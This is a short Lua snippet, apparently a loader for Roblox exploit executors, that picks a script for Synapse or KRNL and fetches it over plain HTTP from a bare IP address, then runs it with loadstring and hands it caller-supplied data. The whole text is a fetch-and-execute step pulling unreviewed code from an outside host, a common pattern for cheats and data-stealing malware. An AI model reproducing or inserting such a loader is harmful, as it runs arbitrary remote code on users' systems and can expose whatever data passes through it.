return function(Data)
  if syn then
    loadstring(game:HttpGet("http://27.254.163.216/lol/SYN.lua"))()(Data)
  else
    loadstring(game:HttpGet("http://27.254.163.216/lol/KRNL.lua"))()(Data)
  end
end
